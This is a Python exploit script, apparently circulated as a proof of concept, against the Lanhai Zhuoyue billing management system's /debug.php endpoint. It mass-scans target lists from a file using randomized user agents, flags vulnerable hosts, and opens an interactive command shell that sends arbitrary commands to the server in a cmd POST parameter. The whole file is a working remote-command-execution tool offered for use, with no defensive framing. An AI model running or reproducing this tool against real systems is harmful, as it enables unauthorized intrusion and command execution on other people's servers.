import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	url2 = url.scheme + '://' + url.netloc + '/debug.php'
	try:
		headers = {'User-Agent': get_ua()}
		res = requests.get(url2,headers=headers,timeout=10,verify=False)
		if res.status_code == 200 and "natshell" in res.text:
			print("\033[32m[+]%s is vulnerable\033[0m" %(url1))
			return 1
		else:
			print("\033[31m[-]%s is no vulnerable\033[0m" %url1)
	except Exception as e:
		print ("[-]%s is timeout\033[0m" %url1)

#cmdshell
def cmdshell(url):
	if check_vuln(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/debug.php'
		while 1:
			cmd = input("\033[35mshell: \033[0m")
			if cmd =="exit":
				sys.exit(0)
			else:
				headers = {'User-Agent': get_ua(),
							'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
				}
				data="cmd=" + cmd
				try:
					res = requests.post(url1,data=data,headers=headers,timeout=10,verify=False)
					if res.status_code==200:
						print("\033[32m%s\033[0m" %res.text)
					else:
						print("\033[31m[-]%s request flase!\033[0m" %url1)

				except Exception as e:
					print("\033[31m[-]%s is timeout!\033[0m" %url1)

#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	蓝海卓越计费管理系统RCE
           
                                                                                                                                          
                              		 By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description=' By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="Target URL; Example:http://ip:port")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
		end=time()
		print('任务完成，用时%d' %(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)